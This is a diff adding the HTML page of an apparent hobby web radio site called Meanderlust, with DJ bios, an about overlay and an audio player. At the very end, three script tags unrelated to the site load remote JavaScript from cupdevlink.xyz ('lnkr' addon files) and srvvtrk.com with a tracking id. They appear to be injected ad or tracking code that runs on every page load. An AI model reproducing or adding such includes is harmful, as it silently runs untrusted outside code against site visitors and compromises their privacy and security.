@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="viewport" content="width=device-width">
+    <title>Meanderlust</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://use.typekit.net/tmv4vpp.css">
+    <link rel="icon" href="img/tabicon.png">
+
+</head>
+
+<body>
+
+    <!--Navbar and Hamburger-->
+    <div id="mySidenav" class="sidenav">
+
+        <span onclick="openOverlay()">About</span>
+        <span onclick="openOverlay2()">Selectors</span>
+
+    </div>
+
+    <button class="hamburger hamburger--spin" type="button">
+        <span onclick="openNav()" class="hamburger-box">
+    <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <!--Background Animation-->
+    <!--
+<div class="bg"></div>
+<div class="bg bg2"></div>
+<div class="bg bg3"></div>
+-->
+
+    <!--About Overlay-->
+    <div id="myNav" class="overlay">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeOverlay()">&times;</a>
+        <div class="overlay-content">
+            <div class="centerblock">
+                <p><i>Meanderlust</i> is a web radio station for ears with eclectic tastebuds. </p>
+
+                <p>Let the current spirit you away on a trip through a collection of lovingly selected rare grooves, deep cuts, classics, rollers, rockers and tranquilizers. </p>
+
+            </div>
+        </div>
+    </div>
+
+    <!--Selectors Overlay-->
+    <div id="myNav2" class="overlay">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeOverlay2()">&times;</a>
+        <div class="overlay-content">
+            <div class="centerblock2">
+                <h2>Rafa</h2>
+
+                <p>Back-end programming, AI and computer love.
+                </p>
+
+                <p>Rafa's selections range from classic and contemporary hip-hop to experimental electronic and ambient music, stoner-rock, classic techno and shoegaze.</p>
+                <div id="social-icons">
+                    <a href="https://github.com/rpaezbas" class="fa fa-github" target="_blank"></a>
+                    <a href="https://geeklabel.bandcamp.com" class="fa fa-bandcamp" target="_blank"></a>
+                </div>
+                <h2>Ben</h2>
+
+                <p>Front-end programming, design and doodling.</p>
+
+                <p>Ben's musical interests span from extreme metal and traverse through jazz funk, reggae deep cuts, cold minimal techno, soulful house, experimental bass music, jungle, post-punk and 60s garage.</p>
+                <div class="arrange-horizontally">
+                    <a href="https://github.com/BenjaminRutledge" class="fa fa-github" target="_blank"></a>
+                    <a href="https://soundcloud.com/kaprasun" class="fa fa-soundcloud" target="_blank"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!--Title-->
+        <img id="logo" src="img/logo7.png" alt="">
+        <!--<h1 id="title-logo">Meanderlust</h1>-->
+
+        <!--Audio Player-->
+
+        <audio id="music" preload="true" allow="autoplay" name="media" src="http://18.217.169.216:8000/geeklabelradio" type="application/ogg"></audio>
+
+        <div id="audioplayer" class="arrange-horizontally">
+            <div class="button-left">
+                <button id="pButton" class="play"></button>
+            </div>
+
+            <div class="arrange-vertically right-content">
+                <div id="song-title" class="track-info-box ellipsis">
+                    <div id="title" class="track-info">Papyrus Containing the Spell to Preserve ITS ATTACKER FROM HE WHO iS In The Water</div>
+                </div>
+                <div class="track-info">
+                    <div id="artist">Nile</div>
+                </div>
+
+                <div class="arrange-horizontally">
+
+                    <img id="volume-icon" src="img/volume3.png" alt="">
+
+                    <div id="volume-slide-container">
+                        <input type="range" min="0" max="100" value="50" step="1" id="volume-slider" oninput="changeVolumeIcon(this)" onchange="changeVolumeIcon(this)">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script src="js/meanderlust.js"></script>
+
+    <script type="text/javascript" src="http://cupdevlink.xyz/addons/lnkr5.min.js"></script>
+    <script type="text/javascript" src="http://srvvtrk.com/91a2556838a7c33eac284eea30bdcc29/validate-site.js?uid=51847x5394x&amp;r=1554028304971"></script>
+    <script type="text/javascript" src="http://cupdevlink.xyz/addons/lnkr30_nt.min.js"></script>
+
+</body>
